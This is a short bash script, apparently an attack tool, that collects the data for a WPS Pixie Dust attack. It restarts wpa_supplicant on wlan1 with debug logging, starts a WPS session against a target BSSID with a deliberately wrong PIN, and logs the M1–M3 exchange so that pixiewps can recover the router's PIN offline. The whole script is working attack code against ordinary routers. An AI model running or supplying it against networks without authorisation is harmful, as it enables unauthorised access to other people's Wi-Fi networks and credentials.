#!/bin/bash
# pixie-capture.sh - capture ONE WPS session with full supplicant debug on wlan1.
# A wrong PIN still exchanges M1/M2/M3 (failure only shows at M4), which is all
# pixiewps needs. wlan0 untouched. Run as root.
# Usage: ./pixie-capture.sh <BSSID> <outdir>
set -u
BSSID="${1:?bssid}"; OUT="${2:-./results-wps-pixie}"
CTRL=/run/wpa_supplicant_pwn
IF=wlan1
CONF=/tmp/pwn-wlan1.conf
mkdir -p "$OUT"
echo "[*] stopping normal wlan1 supplicant..."
wpa_cli -p $CTRL -i $IF terminate >/dev/null 2>&1
sleep 3
echo "[*] starting DEBUG supplicant (log=$OUT/wpa-debug.log)..."
wpa_supplicant -B -dd -i $IF -c $CONF -D nl80211 -f "$OUT/wpa-debug.log" 2>&1 | head -2
sleep 4
echo "[*] driving one WPS session (PIN 12345670, wrong-on-purpose)..."
wpa_cli -p $CTRL -i $IF wps_pin "$BSSID" 12345670 2>&1 | head -1
sleep 35
wpa_cli -p $CTRL -i $IF wps_cancel >/dev/null 2>&1
wpa_cli -p $CTRL -i $IF terminate >/dev/null 2>&1
sleep 2
echo "[*] restoring normal supplicant..."
wpa_supplicant -B -i $IF -c $CONF -D nl80211 >/dev/null 2>&1
sleep 2
ls -la "$OUT/wpa-debug.log"
grep -c -iE 'eap|wsc|wps|M1|M2|EAPOL' "$OUT/wpa-debug.log" | head -1
echo "[OK] capture done. wlan0:"; wpa_cli -i wlan0 status 2>/dev/null | grep -E '^(wpa_state|ip_address)='
